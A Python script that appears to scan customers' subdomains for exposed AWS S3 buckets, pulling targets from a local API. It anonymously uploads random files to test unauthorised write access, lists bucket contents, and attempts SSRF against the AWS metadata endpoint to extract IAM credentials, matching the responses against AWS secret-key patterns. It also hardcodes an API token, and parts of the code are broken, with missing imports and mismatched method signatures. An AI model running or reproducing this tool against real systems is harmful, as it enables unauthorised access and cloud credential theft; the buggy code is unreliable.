import boto3
import botocore
from botocore.exceptions import ClientError
import io
import random
import string
import requests
import json
from datetime import date
#

class s3Checks:
    def __init__(self, record):
        """
        Initialize the s3Checks class with a record containing bucket details.
        """
        self.record_id = record['id']
        self.bucket_name = record['subDomain']
        self.results = {
            "bucket_name": self.bucket_name,
            "is_valid": False,
            "head": False,
            "unauth_upload": False,
            "uploaded_key": None,
            "contents_accessible": False,
            "contents": [],
            "error": None,
            "active_scan_ran": False,
            "metadata_exposed": False,
            "found_secrets": [],
            "metadata_content": []
        }
        self.s3 = self.get_anon_s3_client()

    @staticmethod
    def get_anon_s3_client():
        """
        Create an anonymous S3 client.
        """
        return boto3.client('s3', config=botocore.config.Config(signature_version=botocore.UNSIGNED))

    def head_check_bucket(self):
        """
        Performs a head check on the bucket to determine if it exists and is accessible.
        """
        try:
            self.s3.head_bucket(Bucket=self.bucket_name)
            self.results["head"] = True
            self.results["error"] = None
            print(f"Bucket '{self.bucket_name}' exists and is accessible.")
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == "403":
                self.results["head"] = False
                self.results["error"] = "Bucket exists but access is denied (403)."
            elif code == "404":
                self.results["head"] = False
                self.results["error"] = "Bucket does not exist (404)."
            else:
                self.results["head"] = False
                self.results["error"] = f"ClientError: {code}"
            print(f"Bucket '{self.bucket_name}' head check failed: {self.results['error']}")
        except Exception as e:
            self.results["head"] = False
            self.results["error"] = f"Unexpected error: {e}"
            print(f"Bucket '{self.bucket_name}' head check failed: {self.results['error']}")

    def upload_pseudo_file_to_s3(self):
        """
        Attempts to upload a random file anonymously (if write misconfigured).
        """
        try:
            object_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".txt"
            content = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
            pseudo_file = io.BytesIO(content.encode('utf-8'))

            self.s3.upload_fileobj(pseudo_file, self.bucket_name, object_name)

            # Attempt to confirm existence
            try:
                self.s3.head_object(Bucket=self.bucket_name, Key=object_name)
                self.results["unauth_upload"] = True
                self.results["uploaded_key"] = object_name
                self.results["is_valid"] = True
            except ClientError:
                self.results["unauth_upload"] = False
        except Exception:
            self.results["unauth_upload"] = False

    def list_bucket_contents(self):
        """
        Attempts to list the contents of the bucket.
        """
        try:
            response = self.s3.list_objects_v2(Bucket=self.bucket_name)
            if 'Contents' in response:
                self.results["contents_accessible"] = True
                self.results["contents"] = [obj['Key'] for obj in response['Contents']]
                self.results["is_valid"] = True
            else:
                self.results["contents_accessible"] = False
                self.results["contents"] = []
        except Exception:
            self.results["contents_accessible"] = False
            self.results["contents"] = []
            
    def injection_func(base_url, payload):
        # Example injection into query param `url`
        return f"{base_url}?url={payload}"
    
    @staticmethod
    def do_active_scan(self, base_url, secrets=None):
        """
        Simulates an SSRF check against AWS metadata endpoint.

        base_url: the target base URL (e.g. https://example.com)
        injection_func: a function that returns a URL where payload is injected
        secrets: list of byte strings to match in response
        """
        if secrets is None:
            secrets = ['AKIA', 'ASIA', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCY','S3_KEY', 'S3_SECRET', 'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY', 'AccessKeyId', 'SecretAccessKey',
    'aws_access_key_id', 'aws_secret_access_key', 'aws_session_token']
        schemes = ['', 'http://', 'https://']
        found_secrets = []
        metadata_content = []

        for scheme in schemes:
            metadata_url = scheme + '169.254.169.254/latest/meta-data/iam/security-credentials/'
            target_url = s3Checks.injection_func(base_url, metadata_url)

            try:
                r = requests.get(target_url, timeout=5, verify=False)
            except requests.RequestException:
                continue

            if r.status_code == 200:
                m = re.match(r'^(\S+)$', r.text.strip())
                if not m:
                    continue

                role = m.group(1)
                full_url = metadata_url + role
                target_url = s3Checks.injection_func(base_url, full_url)

                try:
                    r = requests.get(target_url, timeout=5, verify=False)
                    metadata_content = r.text  # Save the raw metadata content
                    for secret in secrets:
                        if secret.encode() in r.content:
                            found_secrets.append(secret)
                except requests.RequestException:
                    continue

        return found_secrets, metadata_content

    def process_bucket(self):
        """
        Perform all checks on the bucket and update the results.
        """
        self.head_check_bucket()
        self.upload_pseudo_file_to_s3()
        self.list_bucket_contents()

        try:
            def simple_injector(base_url, payload):
                return f"{base_url}?url={payload}"

            found_secrets, metadata_content = self.do_active_scan(
                self.bucket_name,
                simple_injector
            )
            self.results["active_scan_ran"] = True
            self.results["found_secrets"] = found_secrets
            if metadata_content:
                self.results["metadata_exposed"] = True
                self.results["metadata_content"] = metadata_content
            else:
                self.results["metadata_exposed"] = False
                self.results["metadata_content"] = []
        except Exception as e:
            self.results["active_scan_ran"] = False
            self.results["found_secrets"] = []
            self.results["metadata_exposed"] = False
            self.results["metadata_content"] = []
            print(f"Active scan error: {e}")

        return self.results


    @staticmethod
    def update_rest_api_with_bucket(record, bucket_results, api_url, api_token):
        # Prepare the data payload for the API
        payload = {
            "record": record["id"],
            "bucket_name": bucket_results["bucket_name"],
            "is_valid": bucket_results["is_valid"],
            "unauth_upload": bucket_results["unauth_upload"],
            "uploaded_key": bucket_results["uploaded_key"],
            "contents_accessible": bucket_results["contents_accessible"],
            "contents": bucket_results["contents"],
            "error": bucket_results["error"],
            "metadata_exposed": bucket_results["metadata_exposed"],
            "found_secrets": bucket_results["found_secrets"],
            "metadata_content": bucket_results["metadata_content"]
        }

        bucket_validations = record.get("bucketvalidation", [])
        existing = next((bv for bv in bucket_validations if bv.get("bucket_name") == bucket_results["bucket_name"]), None)

        headers = {
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json",
        }
        print(api_url)

        if existing:
            # Only update if any value is different
            values_match = all(existing.get(k) == v for k, v in payload.items())
            if values_match:
                print(f"Bucket '{bucket_results['bucket_name']}' already up-to-date. No API call made.")
                return existing

            # PATCH update if any value differs
            patch_url = f"http://{api_url}/bucket-validations/{existing.get('id')}/"
            response = requests.patch(patch_url, json=payload, headers=headers)
            print(response.status_code)
            if response.status_code in (200, 202):
                print(f"Bucket '{bucket_results['bucket_name']}' successfully updated in the API.")
            else:
                print(f"Failed to update bucket '{bucket_results['bucket_name']}' in the API. Response: {response.text}")
            return response.json()
        else:
            # POST create if not found
            print('werwerewrwe', payload)
            response = requests.post(f"http://{api_url}/bucket-validations/create/", json=payload, headers=headers)
            if response.status_code == 201:
                print(f"Bucket '{bucket_results['bucket_name']}' successfully added to the API.")
            else:
                print(f"Failed to add bucket '{bucket_results['bucket_name']}' to the API. Response: ")
            return response.json()
    
def Customer_function(records): 
    outStore = []
    for domain in records:
        # Update GnawControl with the subDomain
            record_id = domain['id']
            alive = domain["alive"]
            print(domain)

            p = domain['subDomain']
            port = domain['OpenPorts']
            outStore.append(domain)            

    return outStore    


if __name__ == '__main__':
    while True:
        # Example dataset

        print('start')
        HostAddress='192.168.86.31'
        Port='5000'
        API_URL = f"{HostAddress}:{Port}"

        headers = {"Content-type": "application/json", "Accept": "application/json"}    
        api_accessKey = '28e6a9b0426a4c042fc3965a2138a7198fca9ac1'
        auth_token_json = {"Authorization": f"Bearer {api_accessKey}"}
        print('[*] Starting exploitation loop...')
        headers.update(auth_token_json)
        url = f'http://{API_URL}/api/customers/'
        getRecords= requests.get(url, headers=headers, verify=False)
        output= getRecords.json()
        print('loading buckets', len(output))

        response = requests.get(f"http://{API_URL}/bucket-validations/", headers=headers)
        buckets_resp = response.json()
        for out in output:
            customerID = out['id']
            url = f'http://{API_URL}/api/customers/{customerID}'    
            getRecords= requests.get(url, headers=headers, verify=False)
            output= getRecords.json()
            print('loading',getRecords.status_code,len(output['customerrecords']))
            output = Customer_function(output['customerrecords'])
            print('to scan ', len(output))
            for record in output:
                sub = record['subDomain']
                #bucket is a list of dics we want the date from here to determine time 
                #until next scan
                bucket = record['bucketvalidation']

                if '*' in sub or record['aws_scan']:
                    continue  # Skip already scanned or wildcard domains

                # Run S3 checks
                s3_checker = s3Checks(record)
                results = s3_checker.process_bucket()

                # Always update the REST API with the bucket results (valid or not)
                api_response = s3Checks.update_rest_api_with_bucket(record, results, API_URL, api_accessKey)
                print(f"API Response: {api_response} for {record['subDomain']}")

                # Update the record to mark as scanned
                record_id = record['id']
                url = f'http://{API_URL}/api/records/{record_id}'
                current_date = date.today().isoformat()
                data = {"aws_scan": True, "aws_scan_date": current_date}
                record.update(data)

                # Remove fields that the API does not expect
                if 'Images' in record:
                    del record['Images']

                # Patch the record in the API
                resp = requests.patch(url, json=record, headers=headers, verify=False)
                print('aws_scan', resp.status_code)
                print(record['subDomain'])

                # Optionally, print a message if the bucket is not valid
                if not (
                    results["head"] or
                    results["is_valid"] or
                    results["unauth_upload"] or
                    results["uploaded_key"] or
                    results["contents_accessible"]
                ):
                    print(f"[!] {record['subDomain']} — no valid indicators.")

            print('stop')
            print("Script finished. Waiting 30 days before running again...")
            time.sleep(30 * 24 * 60 * 60) 